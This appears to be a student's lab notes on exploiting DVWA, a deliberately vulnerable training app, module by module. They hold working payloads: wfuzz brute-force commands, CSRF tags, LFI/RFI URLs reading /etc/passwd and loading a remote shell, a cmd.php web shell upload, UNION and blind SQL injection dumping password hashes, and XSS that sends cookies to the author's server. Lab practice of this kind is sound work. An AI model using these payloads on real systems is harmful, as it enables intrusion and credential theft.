# 2026-2-5
# Going through the DVWA

### Used netdiscover to find the dvwa from linux
 - sudo netdiscover -r 10.0.2.0/24
 
Dvwa running on 10.0.2.3

### Used nmap to test port 80 nmap -p 80 10.0.2.3
```
Starting Nmap 7.95 ( https://nmap.org ) at 2026-02-05 03:47 EST
Nmap scan report for 10.0.2.3
Host is up (0.00034s latency).

PORT   STATE    SERVICE
80/tcp filtered http
MAC Address: 52:55:0A:00:02:03 (Unknown)

Nmap done: 1 IP address (1 host up) scanned in 13.28 seconds
```
## Bruteforce

Used to guess weak passwords by either trying various combinations or using a password list. Kali found in usr/shares/wordlists.  

#### Low and high

Medium just removes the sql injection  

Using burpsuite I intercepted request and sent it to intruder to bruteforce the passsword for admin  

Using wfuzz i bruteforced the dvwa index.php using  

```
wfuzz -c  \
-b "security=low; PHPSESSID=3qn5f80i71vk849kmf51aja8n7" \
-z file,/usr/share/wordlists/password-list.txt \
--hs "incorrect" \
"http://10.0.2.3/vulnerabilities/brute/index.php?username=admin&password=FUZZ&Login=Login"

```
Used this to fuzz for both username and password    

```
 wfuzz -c  \
-b "security=low; PHPSESSID=3qn5f80i71vk849kmf51aja8n7" \
-z file,/usr/share/wordlists/password-list.txt \
-z file,/usr/share/wordlists/password-list.txt \
--hs "incorrect" \
"http://10.0.2.3/vulnerabilities/brute/index.php?username=FUZZ&password=FUZ2Z&Login=Login"

```

## Command injection

Allows execution of arbitrary code on the victim's machine.  

#### Low medium and high

Separate with ; & and && for low and mid  

There was a typo in high mode that allowed for the pipe | command with no space after to be used  

### CSRF

Csrf involves getting the user to do sth they didnt want to do eg click on a link that changes their password.  

#### Low

```http://127.0.0.1:8090//vulnerabilities/csrf/?password_new=passmod&password_conf=passmod&Change=Change 
```
The given code when clicked will change the user's password just by clicking on it.  

#### mid

The protection here is  to check where the referer header aka where the use clicked the link form and if it doesn't match the doamin of the website its not allowed.      

To break this we'll  need to make sure both headers match by embedding a url in an xss(cross site scripting) module and that will trigger the password change.  

```
<img src="http://127.0.0.1:8090//vulnerabilities/csrf/?password_new=passmod&password_conf=passmod&Change=Change"></img>

```

#### high

This mode checks for a unique anti csrf token that is generated on each http session. To bypass we'll need to also use xss to get a valid token.  

We'll need to get the token and add that to the payload and use xss to detonate it.

```
<img src="http://127.0.0.1:8090/vulnerabilities/csrf/?password_new=password&password_conf=password&Change=Change&user_token=document.getElementsByName('user_token')[0].value"></img>

```
### File inclusion

Allows an attacker to compromise a machine via specially crafted url inputs allowing the files to be included in the response.This can be local or remote files.  
LFI - includes files in the server's directory ef etc/shadow.  
RFI- includes files supplied by the attacker's own server.

#### low


LFI: Used the following payload to read from the local file system on the server.
1.) Bond. James Bond 2.) My name is Sherlock Holmes. It is my business to know what other people don't know.

--LINE HIDDEN ;)--

4.) The pool on the roof must have a leak.

```
http://127.0.0.1:8090/vulnerabilities/fi/?page=../../hackable/flags/fi.php

```
RFI: This can be used to include files from a remote server(I created one with python).  

```
http://127.0.0.1:8090/vulnerabilities/fi/?page=http://0.0.0.0:8000/shell.py 

```


#### mid

LFI: This version strips the http and the slashes and replaces them with nothing. However it only does one pass so we can include multiple slashes that when processed will reconstruct the original url.   
```
http://127.0.0.1:8090/vulnerabilities/fi/?page=....//....//hackable/flags/fi.php
```

RFI: will need php streams.

#### high

Checks if the file to be included starts with the name file.Can be exploited using the file protocol file://.    

```
http://127.0.0.1:8090/vulnerabilities/fi/?page=file:///etc/passwd

```

### File Upload

Used to get files onto a server that can later be executed.  

#### low

No checks. Any file can be uploaded and it'll be saved.  

I uploaded a cmd.php script successfully and it was saved and i could attach commands to it to be ran.

```
http://127.0.0.1:8090/hackable/uploads/cmd.php?cmd=ls

```
By supplying the cmd parameter we can run any code on the server. 


Then i can run any commands i want.  

  
#### mid
This checks the content type of the file and only allows jpeg and png. If we intercept the request and change the fields we can successfully upload the file.  

Changing;
```
------WebKitFormBoundaryVST7Ve8Di5ftcw4c
Content-Disposition: form-data; name="uploaded"; filename="cmd.php"
Content-Type: application/x-php

```
to;
```
------WebKitFormBoundaryVST7Ve8Di5ftcw4c
Content-Disposition: form-data; name="uploaded"; filename="cmd.php"
Content-Type: image/jpeg
```
Will allow the php file to be uploaded successfully.  




#### high


### Sql injection


#### low

ID: 1'or '1'='1  
First name: admin  
Surname: admin  
ID: 1'or '1'='1  
First name: Gordon  
Surname: Brown  
ID: 1'or '1'='1  
First name: Hack  
Surname: Me  
ID: 1'or '1'='1  
First name: Pablo  
Surname: Picasso  
ID: 1'or '1'='1  
First name: Bob  
Surname: Smith  

To find passwords via union attacks we need to first find the number of columns.  
' ORDER BY 1--  
' ORDER BY 2--  
' ORDER BY 3--  
etc.

This fails on 3 so we have two columns.  

ID: ID: ' UNION SELECT user,password FROM users#  
First name: admin  
Surname: 5f4dcc3b5aa765d61d8327deb882cf99  
ID: ID: ' UNION SELECT user,password FROM users#  
First name: gordonb  
Surname: e99a18c428cb38d5f260853678922e03  
ID: ID: ' UNION SELECT user,password FROM users#  
First name: 1337  
Surname: 8d3533d75ae2c3966d7e0d4fcc69216b  
ID: ID: ' UNION SELECT user,password FROM users#  
First name: pablo  
Surname: 0d107d09f5bbe40cade3de5c71e9e9b7  
ID: ID: ' UNION SELECT user,password FROM users#  
First name: smithy  
Surname: 5f4dcc3b5aa765d61d8327deb882cf99  

Now we can see the md5 hashed passwords.  

#### mid

escapes the quotes.  

id=2 OR 1=1 UNION SELECT user, password FROM users -- ;#&Submit=Submit

ID: 2 OR 1=1 UNION SELECT user, password FROM users -- ;
First name: admin
Surname: admin
ID: 2 OR 1=1 UNION SELECT user, password FROM users -- ;
First name: Gordon
Surname: Brown
ID: 2 OR 1=1 UNION SELECT user, password FROM users -- ;
First name: Hack
Surname: Me
ID: 2 OR 1=1 UNION SELECT user, password FROM users -- ;
First name: Pablo
Surname: Picasso
ID: 2 OR 1=1 UNION SELECT user, password FROM users -- ;
First name: Bob
Surname: Smith
ID: 2 OR 1=1 UNION SELECT user, password FROM users -- ;
First name: admin
Surname: 5f4dcc3b5aa765d61d8327deb882cf99
ID: 2 OR 1=1 UNION SELECT user, password FROM users -- ;
First name: gordonb
Surname: e99a18c428cb38d5f260853678922e03
ID: 2 OR 1=1 UNION SELECT user, password FROM users -- ;
First name: 1337
Surname: 8d3533d75ae2c3966d7e0d4fcc69216b
ID: 2 OR 1=1 UNION SELECT user, password FROM users -- ;
First name: pablo
Surname: 0d107d09f5bbe40cade3de5c71e9e9b7
ID: 2 OR 1=1 UNION SELECT user, password FROM users -- ;
First name: smithy
Surname: 5f4dcc3b5aa765d61d8327deb882cf99  

#### high

Uses session instead of post but still vulnerable to UNION attacks.  

Click here to change your ID.  
ID: ' UNION SELECT user, password FROM users#  
First name: admin  
Surname: 5f4dcc3b5aa765d61d8327deb882cf99  
ID: ' UNION SELECT user, password FROM users#  
First name: gordonb  
Surname: e99a18c428cb38d5f260853678922e03  
ID: ' UNION SELECT user, password FROM users#  
First name: 1337  
Surname: 8d3533d75ae2c3966d7e0d4fcc69216b  
ID: ' UNION SELECT user, password FROM users#  
First name: pablo  
Surname: 0d107d09f5bbe40cade3de5c71e9e9b7  
ID: ' UNION SELECT user, password FROM users#  
First name: smithy  
Surname: 5f4dcc3b5aa765d61d8327deb882cf99  


### Blind SQL  

a.) Boolean-based blind: Send queries that evaluate to true/false and infer data from differences in page content or behavior.  
b.) Time-based blind: Use database sleep/delay functions to infer data by measuring response time differences.  

#### low
```
1' AND SUBSTRING((SELECT first_name FROM users LIMIT 1), 2, 1) = 'a'#

```
The given payload checks whether the character is in the name and returns valid or missing. Looping through all the letters a-z for all letters we can get the name eg admin  

To get the password we can ;
 
```
1' AND LENGTH((SELECT password FROM users WHERE first_name = 'admin')) = 32#
```
from 1 to 32 to find the length of the password and   

```
1' AND SUBSTRING((SELECT password FROM users WHERE first_name = 'admin'), {pos}, 1) = '{char}'#

Eg (pos 1 = ‘a’):
```
and loop through all letters and characters in pos 1 to extract the md5 hash of the password.  


For Time based sql , instead of using the websites reply we can add sleep and see how long each request takes.  

```
1' AND IF(SUBSTRING((SELECT password FROM users where first_name='admin'), 1, 1) = 'a', SLEEP(5), 0)#
```



#### mid

Similar to sql injection payload without the quotes so.   

```
1 AND ASCII(SUBSTRING((SELECT password FROM users WHERE user_id=1),1,1)) = 53#  
```
which returned “User ID exists.” (The character '5' corresponds to the ASCII code 53).

Loop through to get the password. Can be automated using burps cluster bomb with a grep for user exists.  



#### high

Similar to sql and blind sql low in that it has a limit but that can be commented out.  

```
1' AND SUBSTRING((SELECT password FROM users where first_name='admin'), 1, 1) = '5'#

```
Can be exploited in the same way as the low blind sql.  

SQLMAP can be used to automate the above instead of doing it manually.  

### Weak Session Id's

Session Id's are used to identify users after logging in. If they are poorly implemented they can be used to compromise accounts without bruteforcing passwords etc.   

#### low

Just increments a value.  

#### mid

Uses the time function to get the unicode tine and sets that as the cookie.  

#### high

uses an md5 hash of the value to be incremented. so we'll need to crack the hash to find the original value and then set burp to repeatedly send requests until we login as a different user.  


### XSS(DOM)

Getting code execution by modifying the document object model.  

#### low

We're supposed to select a language but by modifying the dom we can get arbitrary code execution.  
By swithching the default from english to a script , we can run code.  
```
http://127.0.0.1:8090/vulnerabilities/xss_d/?default=<script>alert("hi")</script>

http://127.0.0.1:8090/vulnerabilities/xss_d/?default=<script>alert(document.cookie)</script> for the cookie.

http://127.0.0.1:8090/vulnerabilities/xss_d/?default=<script>window.location="http://127.0.0.1:8000/cookie"=document.cookie</script> -->used to send cookie to our server. 

```

#### mid

There script tag is being stripped. we first exit the select then;  

```
http://127.0.0.1:8090/vulnerabilities/xss_d/?default=English</select><img src='x' onerror=alert(1)>

```

#### high

The user white lists allowable languages so we must find a way to run the code without reaching the server. This can be done by using the # infront of the code we don't want sent.  

```
http://127.0.0.1:8090/vulnerabilities/xss_d/?default=English#</select><img src='x' onerror=alert(1)>

```

### XSS(Reflected)

The script output is visible on client side.  

#### low
No protections. Just add the script tags and execute code.    

```
<script>alert("Hello");</script>
```

#### mid

Strips the script tag but only does one pass.  

```
<<script>script>alert("Hello");</script>

```
It's also case sensitive.  

```
<scRipt>alert("Hello");</script>

```
#### high

Script tags completely blocked so use other kinds of events.  


```
<img src='x' onerror=alert(1)>

```
### XSS(Stored)

Code is stored on the server and executed everytime the page reloads.  

The vulnerabilities are similar to those in the other xss modules.  

#### low

#### mid
Vulnerability is in the name not message.  

#### high

### Content Security Policy(CSP) bypass

Content Security Policy (CSP) is used to define where scripts and other resources can be loaded or executed from.  


#### low
```
http://127.0.0.1:8090/hackable/uploads/script.js
```

I used the file upload to upload script.js --> (1) and by adding that url in the csp it executes.  
External files can be included eg paste bin but that wasn't working. 

#### mid

```
<script nonce="TmV2ZXIgZ29pbmcgdG8gZ2l2ZSB5b3UgdXA=">alert(1)</script>

<script src="http://127.0.0.1:8090/hackable/uploads/script.js"></script>
```

#### high

Inject js direcly in the request url  

```
GET /vulnerabilities/csp/source/jsonp.php?callback=alert(1) HTTP/1.1

```

### Javascript

How js can be manipulated.  


#### low

Get the rot13 of success then md5hash it.  
Modify the hidden token and change the textbox to success and submit. 

You can also call generate token fn from the console.  


#### mid

#### high

